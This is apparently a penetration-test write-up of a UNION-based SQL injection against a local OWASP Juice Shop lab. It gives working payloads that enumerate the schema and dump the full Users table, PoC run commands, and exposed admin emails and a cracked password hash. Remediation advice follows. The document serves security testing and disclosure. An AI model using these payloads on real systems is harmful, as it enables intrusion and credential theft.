# c05 — UNION-based SQL injection → full Users table

**Target:** `http://host.docker.internal:3000` (OWASP Juice Shop, own lab)
**Endpoint:** `GET /rest/products/search?q=`
**Backend:** SQLite (`SQLITE_ERROR` leaked in stack traces)
**Result:** entire `Users` table exfiltrated — 24 rows × 13 columns, including
MD5 password hashes, email addresses and roles.

## 1. Vulnerability

`q` is concatenated into SQL instead of being bound as a parameter. The
reconstructed query (leaked verbatim by SQLite's `unrecognized token` error):

```sql
SELECT * FROM Products
 WHERE ((name LIKE '%<q>%' OR description LIKE '%<q>%'))
   AND deletedAt IS NULL
 ORDER BY name
```

`q` is interpolated **twice**, and the result set has **10 columns**.

## 2. Payload construction

| step | payload | observation |
|---|---|---|
| close literal + paren group | `z'))--` | `200 OK`, query valid, no products |
| find column count | `z')) UNION SELECT 1..N--` for N=8,9,10,11 | only **N=10** parses → `SELECTs to the left and right of UNION do not have the same number of result columns` otherwise |
| must-know gotcha | `... UNION SELECT 1,2,3,4,5,6,'[]',8,9,10` | column 7 (`alternateImages`) is `JSON.parse`d server-side → must be `'[]'` |
| schema | `z')) UNION SELECT 1,name,3,type,... FROM sqlite_master--` | 25 tables (Products, Users, Wallets, Cards, SecurityAnswers, …) |
| Users columns | `z')) UNION SELECT 1,name,3,cid,... FROM pragma_table_info('Users')--` | `id, username, email, password, role, deluxeToken, lastLoginIp, profileImage, totpSecret, isActive, createdAt, updatedAt, deletedAt` |

### Hidden constraint found: `q` is truncated at 200 characters

Not documented in Juice Shop upstream — this instance silently cuts `q` to
**200 chars**, which is a nasty trap: a too-long payload either raises a
syntax error (`near "LI"` when `LIMIT` was cut) or — worse — still returns
`{"status":"success","data":[]}`, i.e. a **silent false negative**. The
`--probe` mode of the PoC brackets this to exactly 200/201.

Because of that, the dump was split into four queries, all ≤ 111 chars:

```
count : z')) UNION SELECT 1,count(*),3,4,5,6,'[]',8,9,10 FROM Users--
main  : z')) UNION SELECT id,username,email,password,role,deluxeToken,'[]',lastLoginIp,totpSecret,isActive FROM Users--
image : z')) UNION SELECT id,profileImage,1,1,1,1,'[]',1,1,1 FROM Users--
times : z')) UNION SELECT id,createdAt,updatedAt,deletedAt,1,1,'[]',1,1,1 FROM Users--
```

Rows are merged client-side on `id`. Plain `UNION` de-duplicates, but because
`id` is always in the projection the rows stay distinct (a constant-only
projection collapses to a single row — an easy way to wrongly conclude the
table is nearly empty).

## 3. PoC

`/workspace/pocs/c05_union_users_dump.py`

```bash
python3 pocs/c05_union_users_dump.py          # full dump + evidence file
python3 pocs/c05_union_users_dump.py --probe  # demonstrate the 200-char cap
```

Outputs:

* `/workspace/evidence/c5_users.txt` — **deliverable**: first 10 rows, `email<TAB>role`
* `/workspace/loot/c5_users_full.json` — all 24 rows, all 13 columns
* `/workspace/loot/c5_users_full.txt` — same, one line per user

## 4. Impact

* 24 accounts, 24 unique emails, complete MD5 password hashes
  (`admin@juice-sh.op` → `0192023a7bbd73250516f069df18b500`, i.e. `admin123`).
* 8 accounts with `role=admin`: `admin@juice-sh.op`,
  `bjoern.kimminich@gmail.com`, `support@juice-sh.op`, `J12934@juice-sh.op`,
  `wurstbrot@juice-sh.op`, `bjoern@juice-sh.op`, `testing@juice-sh.op`,
  `cloud-admin@juice-sh.op`; plus `ciso@juice-sh.op` (`deluxe`).
* `totpSecret` and `deluxeToken` columns are reachable → 2FA secrets and
  deluxe tokens are exposed (all currently empty in this seeded instance,
  but the injection path is proven).

## 5. Remediation

1. Bind `q` as a parameter (`WHERE name LIKE ?`), never concatenate.
2. Do not return driver error text to clients — the SQLite messages leaked the
   query shape and made column-count probing trivial.
3. Reject over-long inputs with `400` instead of silently truncating to 200
   chars (silent truncation masks attacks but also produced the confusing
   empty-success behaviour above).
